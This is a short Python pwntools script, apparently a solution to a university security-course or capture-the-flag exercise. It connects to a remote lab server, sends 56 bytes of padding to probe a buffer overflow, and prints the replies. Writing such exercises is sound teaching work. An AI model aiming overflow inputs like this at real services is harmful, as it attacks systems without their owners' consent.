from pwn import *
import time

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22161

s = remote(SERVER, PORT, timeout=9999)

print(s.recv(512).decode())
s.sendline(b'x' * 56)
time.sleep(1)
print(s.recv(512).decode())